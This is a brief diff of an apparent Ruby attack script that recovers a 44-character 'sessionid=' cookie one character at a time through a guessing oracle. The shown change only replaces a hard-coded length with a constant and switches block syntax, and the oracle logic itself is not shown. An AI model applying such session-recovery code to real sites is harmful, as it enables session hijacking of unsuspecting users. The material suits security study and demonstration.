@@ -42,7 +42,7 @@ b64.push('=')
 brokenstring = "sessionid="
 
 SESSIONSIZE = 44
-(44).times {
+(SESSIONSIZE).times do
     #Each iteration determines one character
     winningchar = '|' #Test = not a valid char
     winningcharcount = 9000 #Arbitrarily large
@@ -73,5 +73,6 @@ SESSIONSIZE = 44
     end
     
     brokenstring << winningchar.to_s
-}
+end
+
 puts brokenstring
